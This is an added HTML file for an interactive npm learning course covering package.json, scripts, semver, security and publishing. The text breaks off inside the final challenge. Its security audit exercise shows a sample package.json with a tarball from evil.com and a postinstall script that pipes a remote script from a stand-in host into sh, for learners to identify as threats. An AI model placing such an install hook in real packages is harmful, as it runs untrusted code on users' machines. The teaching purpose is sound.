@@ -1,0 +1,1586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NPM Mastery Bootcamp - Interactive Learning</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-dark: #0f172a;
+            --bg-card: #1e293b;
+            --accent: #cb3837;
+            --accent-light: #ff6b6b;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --info: #3b82f6;
+            --text: #e2e8f0;
+            --text-muted: #94a3b8;
+            --border: #334155;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Header & Navigation */
+        header {
+            background: linear-gradient(135deg, var(--bg-card) 0%, #2d3748 100%);
+            padding: 1rem 2rem;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 2px solid var(--accent);
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
+        }
+
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo::before {
+            content: "📦";
+            font-size: 1.8rem;
+        }
+
+        .progress-container {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: rgba(0,0,0,0.3);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+        }
+
+        .progress-bar {
+            width: 200px;
+            height: 10px;
+            background: var(--border);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--accent-light));
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .xp-counter {
+            font-family: monospace;
+            color: var(--success);
+            font-weight: bold;
+        }
+
+        /* Main Layout */
+        main {
+            margin-top: 80px;
+            padding: 2rem;
+            max-width: 1400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .module-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .module-card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 1.5rem;
+            border: 1px solid var(--border);
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .module-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px -5px rgba(203, 56, 55, 0.3);
+            border-color: var(--accent);
+        }
+
+        .module-card.completed::after {
+            content: "✓";
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--success);
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .module-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .module-title {
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+
+        .module-desc {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .difficulty {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            margin-top: 1rem;
+            font-weight: bold;
+        }
+
+        .difficulty.easy { background: rgba(16, 185, 129, 0.2); color: var(--success); }
+        .difficulty.medium { background: rgba(245, 158, 11, 0.2); color: var(--warning); }
+        .difficulty.hard { background: rgba(239, 68, 68, 0.2); color: var(--accent-light); }
+
+        /* Interactive Sections */
+        .interactive-container {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid var(--border);
+            display: none;
+        }
+
+        .interactive-container.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .back-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 1rem;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover {
+            background: var(--border);
+        }
+
+        /* Terminal Simulator */
+        .terminal {
+            background: #000;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            margin: 1rem 0;
+            border: 1px solid #333;
+        }
+
+        .terminal-header {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #333;
+        }
+
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-btn.red { background: #ff5f56; }
+        .terminal-btn.yellow { background: #ffbd2e; }
+        .terminal-btn.green { background: #27c93f; }
+
+        .terminal-body {
+            color: #0f0;
+            line-height: 1.8;
+            min-height: 200px;
+            white-space: pre-wrap;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            align-items: center;
+            margin-top: 0.5rem;
+        }
+
+        .prompt {
+            color: var(--accent);
+            margin-right: 0.5rem;
+        }
+
+        .terminal-input {
+            background: transparent;
+            border: none;
+            color: #0f0;
+            font-family: inherit;
+            font-size: inherit;
+            width: 100%;
+            outline: none;
+        }
+
+        /* JSON Builder */
+        .json-builder {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin-top: 1rem;
+        }
+
+        .json-form {
+            background: rgba(0,0,0,0.3);
+            padding: 1.5rem;
+            border-radius: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 0.5rem;
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            color: var(--text);
+            border-radius: 4px;
+            font-family: monospace;
+        }
+
+        .json-preview {
+            background: #282c34;
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: monospace;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .json-key { color: #e06c75; }
+        .json-string { color: #98c379; }
+        .json-number { color: #d19a66; }
+        .json-boolean { color: #d19a66; }
+
+        /* Dependency Visualizer */
+        .dep-tree {
+            background: rgba(0,0,0,0.2);
+            padding: 2rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            min-height: 300px;
+            position: relative;
+        }
+
+        .node {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--bg-card);
+            border: 2px solid var(--info);
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            margin: 0.5rem;
+            cursor: move;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .node:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+        }
+
+        .node.production { border-color: var(--success); }
+        .node.dev { border-color: var(--warning); }
+        .node.vulnerable { border-color: var(--accent); animation: pulse 2s infinite; }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(203, 56, 55, 0.4); }
+            50% { box-shadow: 0 0 0 10px rgba(203, 56, 55, 0); }
+        }
+
+        .connection {
+            position: absolute;
+            background: var(--border);
+            z-index: -1;
+        }
+
+        /* Semantic Versioning Game */
+        .semver-game {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .semver-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 1.5rem;
+            border-radius: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .semver-card:hover {
+            transform: translateY(-5px);
+            border-color: white;
+        }
+
+        .semver-card.selected {
+            border-color: var(--success);
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.5);
+        }
+
+        .version-display {
+            font-size: 2rem;
+            font-weight: bold;
+            font-family: monospace;
+            margin: 1rem 0;
+        }
+
+        .change-type {
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        /* Quiz Styles */
+        .quiz-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .question-card {
+            background: rgba(0,0,0,0.2);
+            padding: 2rem;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            border-left: 4px solid var(--accent);
+        }
+
+        .question-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .question-number {
+            background: var(--accent);
+            color: white;
+            padding: 0.25rem 0.75rem;
+            border-radius: 12px;
+            font-size: 0.875rem;
+            font-weight: bold;
+        }
+
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            margin-top: 1rem;
+        }
+
+        .option {
+            background: var(--bg-dark);
+            border: 2px solid var(--border);
+            padding: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .option:hover {
+            border-color: var(--info);
+            background: rgba(59, 130, 246, 0.1);
+        }
+
+        .option.correct {
+            border-color: var(--success);
+            background: rgba(16, 185, 129, 0.1);
+        }
+
+        .option.wrong {
+            border-color: var(--accent);
+            background: rgba(203, 56, 55, 0.1);
+        }
+
+        .option input {
+            display: none;
+        }
+
+        .option-label {
+            font-weight: bold;
+            min-width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--border);
+            border-radius: 50%;
+        }
+
+        .option.correct .option-label {
+            background: var(--success);
+            color: white;
+        }
+
+        .option.wrong .option-label {
+            background: var(--accent);
+            color: white;
+        }
+
+        /* Pitfall Warning Box */
+        .pitfall-box {
+            background: linear-gradient(135deg, rgba(203, 56, 55, 0.1) 0%, rgba(203, 56, 55, 0.05) 100%);
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            position: relative;
+            padding-left: 3rem;
+        }
+
+        .pitfall-box::before {
+            content: "⚠️";
+            position: absolute;
+            left: 1rem;
+            top: 1.5rem;
+            font-size: 1.2rem;
+        }
+
+        .pitfall-title {
+            color: var(--accent-light);
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+
+        /* Exercise Area */
+        .exercise-area {
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 1rem 0;
+        }
+
+        .code-editor {
+            background: #1e1e1e;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            margin: 1rem 0;
+            border: 1px solid #333;
+        }
+
+        .code-line {
+            counter-increment: line;
+            padding-left: 3rem;
+            position: relative;
+            line-height: 1.8;
+        }
+
+        .code-line::before {
+            content: counter(line);
+            position: absolute;
+            left: 0;
+            color: #666;
+            width: 2rem;
+            text-align: right;
+        }
+
+        .editable {
+            background: rgba(255,255,255,0.1);
+            border-bottom: 2px dashed var(--info);
+            padding: 0 0.25rem;
+            cursor: text;
+            min-width: 100px;
+            display: inline-block;
+        }
+
+        .editable:focus {
+            outline: none;
+            background: rgba(59, 130, 246, 0.2);
+            border-bottom-style: solid;
+        }
+
+        /* Buttons */
+        .btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn:hover {
+            background: var(--accent-light);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(203, 56, 55, 0.4);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid var(--accent);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(203, 56, 55, 0.1);
+        }
+
+        .btn-success {
+            background: var(--success);
+        }
+
+        .btn-success:hover {
+            background: #059669;
+        }
+
+        /* Feedback Messages */
+        .feedback {
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            display: none;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .feedback.show {
+            display: flex;
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .feedback.success {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid var(--success);
+            color: var(--success);
+        }
+
+        .feedback.error {
+            background: rgba(203, 56, 55, 0.1);
+            border: 1px solid var(--accent);
+            color: var(--accent-light);
+        }
+
+        /* Badge Collection */
+        .badge-container {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin: 1rem 0;
+        }
+
+        .badge {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.875rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            opacity: 0.3;
+            transition: opacity 0.3s;
+        }
+
+        .badge.earned {
+            opacity: 1;
+            animation: badgePop 0.5s;
+            box-shadow: 0 4px 12px rgba(245, 87, 108, 0.4);
+        }
+
+        @keyframes badgePop {
+            0% { transform: scale(0) rotate(-10deg); }
+            50% { transform: scale(1.2) rotate(5deg); }
+            100% { transform: scale(1) rotate(0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .json-builder {
+                grid-template-columns: 1fr;
+            }
+            .semver-game {
+                grid-template-columns: 1fr;
+            }
+            .module-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Confetti Canvas */
+        #confetti-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <canvas id="confetti-canvas"></canvas>
+
+    <header>
+        <div class="header-content">
+            <div class="logo">NPM Mastery Bootcamp</div>
+            <div class="progress-container">
+                <span>Progress:</span>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <span class="xp-counter" id="xpCounter">XP: 0</span>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <!-- Module Selection Grid -->
+        <div id="moduleGrid" class="module-grid">
+            <div class="module-card" onclick="openModule('packagejson')">
+                <div class="module-icon">📋</div>
+                <h3 class="module-title">Package.json Deep Dive</h3>
+                <p class="module-desc">Master the heart of every Node project. Build JSON files, understand metadata, and configure your package correctly.</p>
+                <span class="difficulty easy">Beginner</span>
+            </div>
+
+            <div class="module-card" onclick="openModule('scripts')">
+                <div class="module-icon">⚡</div>
+                <h3 class="module-title">NPM Scripts Power</h3>
+                <p class="module-desc">Automate workflows, chain commands, and use lifecycle hooks like a senior developer.</p>
+                <span class="difficulty medium">Intermediate</span>
+            </div>
+
+            <div class="module-card" onclick="openModule('semver')">
+                <div class="module-icon">🔢</div>
+                <h3 class="module-title">Semantic Versioning</h3>
+                <p class="module-desc">Decode version numbers, manage breaking changes, and solve dependency hell.</p>
+                <span class="difficulty medium">Intermediate</span>
+            </div>
+
+            <div class="module-card" onclick="openModule('security')">
+                <div class="module-icon">🔒</div>
+                <h3 class="module-title">Package Security</h3>
+                <p class="module-desc">Detect vulnerabilities, audit dependencies, and protect against supply chain attacks.</p>
+                <span class="difficulty hard">Advanced</span>
+            </div>
+
+            <div class="module-card" onclick="openModule('publishing')">
+                <div class="module-icon">🚀</div>
+                <h3 class="module-title">Publishing Packages</h3>
+                <p class="module-desc">Build, publish, and maintain open source packages that developers love.</p>
+                <span class="difficulty hard">Advanced</span>
+            </div>
+
+            <div class="module-card" onclick="openModule('final')">
+                <div class="module-icon">🏆</div>
+                <h3 class="module-title">Final Challenge</h3>
+                <p class="module-desc">Prove your mastery with real-world scenarios and complex troubleshooting.</p>
+                <span class="difficulty hard">Expert</span>
+            </div>
+        </div>
+
+        <!-- Module 1: Package.json -->
+        <div id="packagejson" class="interactive-container">
+            <button class="back-btn" onclick="showGrid()">← Back to Modules</button>
+            <h2>📋 Package.json Architect</h2>
+            
+            <div class="pitfall-box">
+                <div class="pitfall-title">Common Mistake: Missing Required Fields</div>
+                <p>Many developers forget that <code>name</code> and <code>version</code> are required! Also, package names must be lowercase and can't contain special characters except hyphen and underscore.</p>
+            </div>
+
+            <div class="json-builder">
+                <div class="json-form">
+                    <h3>Configure Your Package</h3>
+                    <div class="form-group">
+                        <label>Package Name (lowercase, no spaces)</label>
+                        <input type="text" id="pkgName" placeholder="my-awesome-package" oninput="updateJson()">
+                    </div>
+                    <div class="form-group">
+                        <label>Version</label>
+                        <input type="text" id="pkgVersion" placeholder="1.0.0" value="1.0.0" oninput="updateJson()">
+                    </div>
+                    <div class="form-group">
+                        <label>Description</label>
+                        <input type="text" id="pkgDesc" placeholder="Does something amazing" oninput="updateJson()">
+                    </div>
+                    <div class="form-group">
+                        <label>Main Entry Point</label>
+                        <input type="text" id="pkgMain" placeholder="index.js" value="index.js" oninput="updateJson()">
+                    </div>
+                    <div class="form-group">
+                        <label>License</label>
+                        <select id="pkgLicense" onchange="updateJson()">
+                            <option value="MIT">MIT</option>
+                            <option value="ISC">ISC</option>
+                            <option value="Apache-2.0">Apache-2.0</option>
+                            <option value="GPL-3.0">GPL-3.0</option>
+                        </select>
+                    </div>
+                    
+                    <div style="margin-top: 1rem;">
+                        <button class="btn" onclick="validatePackageJson()">Validate Package</button>
+                    </div>
+                </div>
+
+                <div class="json-preview" id="jsonPreview">
+                    <!-- JSON preview generated here -->
+                </div>
+            </div>
+
+            <div class="exercise-area" style="margin-top: 2rem;">
+                <h3>🎯 Exercise: Fix the Broken Package</h3>
+                <p>Below is a package.json with 3 intentional errors. Identify and fix them:</p>
+                <div class="code-editor" id="brokenJson">
+                    <div class="code-line">{</div>
+                    <div class="code-line">  <span class="json-key">"name"</span>: <span class="editable" contenteditable="true" id="fix1">My Awesome App</span>,</div>
+                    <div class="code-line">  <span class="json-key">"version"</span>: <span class="editable" contenteditable="true" id="fix2">v1.0.0</span>,</div>
+                    <div class="code-line">  <span class="json-key">"main"</span>: <span class="json-string">"index.js"</span>,</div>
+                    <div class="code-line">  <span class="json-key">"dependencies"</span>: {</div>
+                    <div class="code-line">    <span class="json-key">"lodash"</span>: <span class="editable" contenteditable="true" id="fix3">latest</span></div>
+                    <div class="code-line">  }</div>
+                    <div class="code-line">}</div>
+                </div>
+                <button class="btn" onclick="checkJsonFixes()">Check Fixes</button>
+                <div id="jsonFeedback" class="feedback"></div>
+            </div>
+
+            <div class="pitfall-box">
+                <div class="pitfall-title">Performance Pitfall: Using "latest" Tag</div>
+                <p>Never use <code>"latest"</code> in production! It breaks reproducibility. Your future self (and your team) will hate you when a breaking change auto-installs during deployment.</p>
+            </div>
+        </div>
+
+        <!-- Module 2: NPM Scripts -->
+        <div id="scripts" class="interactive-container">
+            <button class="back-btn" onclick="showGrid()">← Back to Modules</button>
+            <h2>⚡ NPM Scripts Playground</h2>
+
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="terminal-btn red"></div>
+                    <div class="terminal-btn yellow"></div>
+                    <div class="terminal-btn green"></div>
+                    <span style="margin-left: 1rem; color: #666; font-size: 0.875rem;">Terminal</span>
+                </div>
+                <div class="terminal-body" id="terminalBody">
+                    <div>Welcome to NPM Scripts Simulator v2.0</div>
+                    <div>Type 'help' for available commands</div>
+                </div>
+                <div class="terminal-input-line">
+                    <span class="prompt">$</span>
+                    <input type="text" class="terminal-input" id="terminalInput" placeholder="npm run..." onkeypress="handleTerminal(event)">
+                </div>
+            </div>
+
+            <div class="exercise-area">
+                <h3>🧩 Script Builder Challenge</h3>
+                <p>Drag the correct commands to build a deployment pipeline:</p>
+                
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin-top: 1rem;">
+                    <div>
+                        <h4>Available Commands:</h4>
+                        <div id="scriptCommands" style="display: flex; flex-direction: column; gap: 0.5rem;">
+                            <div class="option" draggable="true" ondragstart="drag(event)" data-cmd="test">npm test</div>
+                            <div class="option" draggable="true" ondragstart="drag(event)" data-cmd="build">npm run build</div>
+                            <div class="option" draggable="true" ondragstart="drag(event)" data-cmd="lint">eslint src/</div>
+                            <div class="option" draggable="true" ondragstart="drag(event)" data-cmd="deploy">gh-pages -d dist</div>
+                        </div>
+                    </div>
+                    <div>
+                        <h4>Pre-deploy Script (Drop here in order):</h4>
+                        <div id="scriptDrop" ondrop="drop(event)" ondragover="allowDrop(event)" style="min-height: 200px; background: rgba(0,0,0,0.2); border: 2px dashed var(--border); border-radius: 8px; padding: 1rem;">
+                            <p style="color: var(--text-muted); text-align: center; margin-top: 4rem;">Drop commands here</p>
+                        </div>
+                    </div>
+                </div>
+                <button class="btn" onclick="checkScriptOrder()" style="margin-top: 1rem;">Verify Pipeline</button>
+            </div>
+
+            <div class="pitfall-box">
+                <div class="pitfall-title">Lifecycle Confusion: pre/post hooks</div>
+                <p>Did you know? If you have a script called <code>build</code>, NPM will automatically run <code>prebuild</code> before it and <code>postbuild</code> after it! Don't create infinite loops by calling the parent script in pre/post hooks.</p>
+            </div>
+
+            <div class="quiz-container" style="margin-top: 2rem;">
+                <h3>Quick Quiz: Script Syntax</h3>
+                <div class="question-card">
+                    <div class="question-header">
+                        <span>What's wrong with this script?</span>
+                        <span class="question-number">Q1</span>
+                    </div>
+                    <div class="code-editor">
+                        <div class="code-line"><span class="json-key">"scripts"</span>: {</div>
+                        <div class="code-line">  <span class="json-key">"start"</span>: <span class="json-string">"node server.js && npm start"</span></div>
+                        <div class="code-line">}</div>
+                    </div>
+                    <div class="options">
+                        <label class="option" onclick="selectOption(this, false)">
+                            <span class="option-label">A</span>
+                            <span>Nothing, it's a valid restart pattern</span>
+                        </label>
+                        <label class="option" onclick="selectOption(this, true)">
+                            <span class="option-label">B</span>
+                            <span>Infinite loop - start calls itself</span>
+                        </label>
+                        <label class="option" onclick="selectOption(this, false)">
+                            <span class="option-label">C</span>
+                            <span>&& should be ||</span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Module 3: Semantic Versioning -->
+        <div id="semver" class="interactive-container">
+            <button class="back-btn" onclick="showGrid()">← Back to Modules</button>
+            <h2>🔢 Semantic Versioning Master</h2>
+
+            <div style="background: rgba(59, 130, 246, 0.1); padding: 1.5rem; border-radius: 8px; margin: 1rem 0; border-left: 4px solid var(--info);">
+                <strong>MAJOR.MINOR.PATCH</strong><br>
+                <code>Breaking.Feature.Fix</code> - Remember this mantra!
+            </div>
+
+            <h3>🎮 Version Matching Game</h3>
+            <p>Select which version components to increment for each change:</p>
+
+            <div class="semver-game" id="semverGame">
+                <!-- Generated by JS -->
+            </div>
+
+            <div class="exercise-area" style="margin-top: 2rem;">
+                <h3>🎯 Dependency Resolution Challenge</h3>
+                <p>Your package depends on <code>lodash</code> with version <code>^4.17.0</code>. Which versions are compatible?</p>
+                
+                <div class="dep-tree" style="display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center;">
+                    <div class="node" onclick="toggleNode(this)" data-correct="true">
+                        📦 lodash@4.17.21
+                    </div>
+                    <div class="node" onclick="toggleNode(this)" data-correct="true">
+                        📦 lodash@4.25.0
+                    </div>
+                    <div class="node" onclick="toggleNode(this)" data-correct="false">
+                        📦 lodash@5.0.0
+                    </div>
+                    <div class="node" onclick="toggleNode(this)" data-correct="true">
+                        📦 lodash@4.17.0
+                    </div>
+                    <div class="node" onclick="toggleNode(this)" data-correct="false">
+                        📦 lodash@3.10.1
+                    </div>
+                </div>
+                <button class="btn" onclick="checkSemverResolution()">Check Compatibility</button>
+                <div id="semverFeedback" class="feedback"></div>
+            </div>
+
+            <div class="pitfall-box">
+                <div class="pitfall-title">The ^ vs ~ Trap</div>
+                <p><code>^1.2.3</code> allows minor updates (1.x.x) but <code>~1.2.3</code> only allows patch updates (1.2.x). In 0.x.x versions (initial development), both act differently! <code>^0.2.3</code> only allows 0.2.x, not 0.3.0.</p>
+            </div>
+        </div>
+
+        <!-- Module 4: Security -->
+        <div id="security" class="interactive-container">
+            <button class="back-btn" onclick="showGrid()">← Back to Modules</button>
+            <h2>🔒 Security Audit Simulator</h2>
+
+            <div class="pitfall-box">
+                <div class="pitfall-title">Supply Chain Attack Alert</div>
+                <p>Typosquatting is real! Packages like <code>lodash</code> vs <code>loadsh</code> or <code>express</code> vs <code>expres</code>. Always double-check package names before installing.</p>
+            </div>
+
+            <div class="exercise-area">
+                <h3>🔍 Find the Vulnerabilities</h3>
+                <p>Review this package.json and identify security issues:</p>
+                <div class="code-editor">
+                    <div class="code-line">{</div>
+                    <div class="code-line">  <span class="json-key">"dependencies"</span>: {</div>
+                    <div class="code-line">    <span class="json-key">"lodash"</span>: <span class="json-string">"4.17.4"</span>, <span style="color: #666;">// CVE-2019-10744</span></div>
+                    <div class="code-line">    <span class="json-key">"left-pad"</span>: <span class="json-string">"1.0.0"</span>, <span style="color: #666;">// Unmaintained</span></div>
+                    <div class="code-line">    <span class="json-key">"malicious-pkg"</span>: <span class="json-string">"https://evil.com/package.tar.gz"</span></div>
+                    <div class="code-line">  },</div>
+                    <div class="code-line">  <span class="json-key">"scripts"</span>: {</div>
+                    <div class="code-line">    <span class="json-key">"postinstall"</span>: <span class="json-string">"curl https://suspicious.com/script | sh"</span></div>
+                    <div class="code-line">  }</div>
+                    <div class="code-line">}</div>
+                </div>
+                
+                <div style="margin-top: 1rem;">
+                    <label style="display: flex; align-items: center; gap: 0.5rem; margin: 0.5rem 0;">
+                        <input type="checkbox" id="sec1"> Outdated vulnerable dependency
+                    </label>
+                    <label style="display: flex; align-items: center; gap: 0.5rem; margin: 0.5rem 0;">
+                        <input type="checkbox" id="sec2"> Untrusted tarball URL
+                    </label>
+                    <label style="display: flex; align-items: center; gap: 0.5rem; margin: 0.5rem 0;">
+                        <input type="checkbox" id="sec3"> Dangerous postinstall script
+                    </label>
+                    <label style="display: flex; align-items: center; gap: 0.5rem; margin: 0.5rem 0;">
+                        <input type="checkbox" id="sec4"> Deprecated/unmaintained package
+                    </label>
+                </div>
+                <button class="btn" onclick="checkSecurity()">Submit Audit</button>
+            </div>
+
+            <div class="terminal" style="margin-top: 2rem;">
+                <div class="terminal-header">
+                    <div class="terminal-btn red"></div>
+                    <div class="terminal-btn yellow"></div>
+                    <div class="terminal-btn green"></div>
+                    <span style="margin-left: 1rem; color: #666; font-size: 0.875rem;">npm audit</span>
+                </div>
+                <div class="terminal-body" id="auditOutput">
+                    Run the audit above to see results...
+                </div>
+            </div>
+
+            <div class="pitfall-box">
+                <div class="pitfall-title">The "postinstall" Horror</div>
+                <p>Postinstall scripts run automatically on npm install. Malicious packages use this to steal environment variables or modify source code. Always use <code>npm install --ignore-scripts</code> when reviewing new packages!</p>
+            </div>
+        </div>
+
+        <!-- Module 5: Publishing -->
+        <div id="publishing" class="interactive-container">
+            <button class="back-btn" onclick="showGrid()">← Back to Modules</button>
+            <h2>🚀 Package Publishing Workshop</h2>
+
+            <div class="exercise-area">
+                <h3>📦 Pre-publish Checklist</h3>
+                <div id="publishChecklist">
+                    <div class="option" onclick="toggleCheck(this)">
+                        <span class="option-label">☐</span>
+                        <span>Version bumped in package.json?</span>
+                    </div>
+                    <div class="option" onclick="toggleCheck(this)">
+                        <span class="option-label">☐</span>
+                        <span>.gitignore excludes node_modules?</span>
+                    </div>
+                    <div class="option" onclick="toggleCheck(this)">
+                        <span class="option-label">☐</span>
+                        <span>.npmignore or files array configured?</span>
+                    </div>
+                    <div class="option" onclick="toggleCheck(this)">
+                        <span class="option-label">☐</span>
+                        <span>README.md includes usage examples?</span>
+                    </div>
+                    <div class="option" onclick="toggleCheck(this)">
+                        <span class="option-label">☐</span>
+                        <span>Tested with npm pack?</span>
+                    </div>
+                </div>
+                <button class="btn" onclick="simulatePublish()" style="margin-top: 1rem;">Simulate Publish</button>
+                <div id="publishFeedback" class="feedback"></div>
+            </div>
+
+            <div class="pitfall-box">
+                <div class="pitfall-title">The "files" Field Fiasco</div>
+                <p>Without a <code>files</code> array in package.json, you might publish your .env files, tests, or entire source maps! Always whitelist what goes to NPM using the "files" array or .npmignore.</p>
+            </div>
+
+            <div class="quiz-container">
+                <h3>Version Strategy Quiz</h3>
+                <div class="question-card">
+                    <p>You've fixed a critical bug that was crashing production. The current version is 2.4.1. What should the new version be?</p>
+                    <div class="options">
+                        <label class="option" onclick="selectOption(this, false)">
+                            <span class="option-label">A</span>
+                            <span>2.5.0 (New feature)</span>
+                        </label>
+                        <label class="option" onclick="selectOption(this, true)">
+                            <span class="option-label">B</span>
+                            <span>2.4.2 (Bug fix)</span>
+                        </label>
+                        <label class="option" onclick="selectOption(this, false)">
+                            <span class="option-label">C</span>
+                            <span>3.0.0 (Breaking change)</span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Final Challenge -->
+        <div id="final" class="interactive-container">
+            <button class="back-btn" onclick="showGrid()">← Back to Modules</button>
+            <h2>🏆 Final Challenge: The Broken Build</h2>
+            
+            <div class="exercise-area">
+                <p><strong>Scenario:</strong> You're joining a team and their CI/CD is failing. Review the setup and fix all issues:</p>
+                
+                <div class="code-editor" style="margin-top: 1rem;">
+                    <div class="code-line"><span style="color: #666;">// package.json</span></div>
+                    <div class="code-line">{</div>
